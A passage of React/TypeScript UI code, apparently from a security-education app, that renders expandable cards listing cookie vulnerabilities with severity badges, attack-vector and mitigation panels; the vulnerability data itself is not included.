  const border = (c: string) => c === "red" ? "border-red-500/20 hover:border-red-500/40" : c === "orange" ? "border-orange-500/20 hover:border-orange-500/40" : "border-yellow-500/20 hover:border-yellow-500/40"

  return (
    <div className="space-y-4">
      <div className="glass p-5 rounded-2xl border-white/5 flex gap-3 mb-6">
        <ShieldAlert className="w-5 h-5 text-rose-400 shrink-0 mt-0.5" />
        <p className="text-sm text-gray-400 leading-relaxed">
          Cookie vulnerabilities are a constant target because browsers automatically attach cookies to every request. Each vulnerability below exploits a different aspect of cookie behavior. Click to see the attack and mitigation.
        </p>
      </div>
      {VULNS.map(v => (
        <motion.div key={v.id} layout className={cn("glass rounded-[24px] border overflow-hidden transition-colors", border(v.color))}>
          <button onClick={() => setExpanded(expanded === v.id ? null : v.id)} className="w-full p-5 flex items-start gap-4 text-left">
            <span className={cn("px-2.5 py-1 rounded-lg text-[10px] font-black border shrink-0", badge(v.severity))}>{v.severity}</span>
            <div className="flex-1">
              <h3 className="text-sm font-bold mb-1">{v.title}</h3>
              <p className="text-[12px] text-gray-500 leading-relaxed">{v.summary}</p>
            </div>
            <ChevronRight className={cn("w-4 h-4 text-gray-600 shrink-0 mt-1 transition-transform", expanded === v.id && "rotate-90")} />
          </button>
          <AnimatePresence>
            {expanded === v.id && (
              <motion.div initial={{ height: 0 }} animate={{ height: "auto" }} exit={{ height: 0 }} className="overflow-hidden">
                <div className="px-5 pb-6 space-y-4 border-t border-white/5 pt-4">
                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <p className="text-[10px] font-black uppercase tracking-widest text-red-500">Attack Vector</p>
                      <pre className="bg-black/60 border border-red-500/10 rounded-xl p-4 text-xs font-mono text-red-300 whitespace-pre-wrap leading-relaxed">{v.attack}</pre>
                    </div>
                    <div className="space-y-2">
                      <p className="text-[10px] font-black uppercase tracking-widest text-emerald-500">Mitigation</p>
                      <div className="bg-emerald-500/5 border border-emerald-500/10 rounded-xl p-4 text-[13px] text-emerald-300/80 leading-relaxed h-full">{v.mitigation}</div>
                    </div>
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </motion.div>
      ))}
    </div>
  )
}
